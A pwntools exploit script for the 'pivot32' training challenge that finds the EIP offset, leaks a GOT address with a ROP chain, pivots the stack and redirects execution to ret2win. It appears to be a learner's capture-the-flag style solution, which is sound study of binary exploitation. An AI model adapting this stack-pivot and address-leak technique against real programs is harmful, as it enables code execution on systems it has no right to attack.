from pwn import *
import binascii
import warnings
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
break print_file
'''.format(**locals())

exe = './pivot32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', 'a')
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100))

print_file = 0x80483d0
data = 0x0804a018

elf_puts_plt = elf.plt.puts
elf_fh_plt = elf.plt.foothold_function
elf_fh_got = elf.got.foothold_function
pivot_addr = 0xf7db4f10
xchg_eax_esp = 0x0804882e
pop_eax = 0x0804882c

payload_1 = flat(
elf_fh_plt,
elf_puts_plt,
elf.symbols.main,
elf_fh_got
)

payload_2 = flat(
asm('nop') * eip_offset,
pop_eax,
pivot_addr,
xchg_eax_esp,
)

io = start()
io.sendlineafter('>', payload_1)
io.sendlineafter('>', payload_2)

#io.interactive()
io.recvlines(2)
leaked_address = io.recv() # recv() everything after the first 2 lines

foothold_leak = unpack(leaked_address[:4].strip())
library_base = foothold_leak - 0x77d
ret2win = library_base + 0x974

exploit = flat(
asm('nop') * eip_offset,
ret2win
) 
io.close()

io = start()
io.sendlineafter('>', 'anything')
io.sendlineafter('>', exploit)
io.wait()
"""
Playing around with pwntools io library
# io.interactive() # use this to observe how many lines of output

line1 = io.recvline(1)
line2 = io.recvline(1)
# line3 = io.recvline(1) # over here we observe EOF error
print(line1)
print(line2)
# print(line3)

lines = io.recvline(2)
print(lines)
"""
return_data = io.clean()
print(return_data)
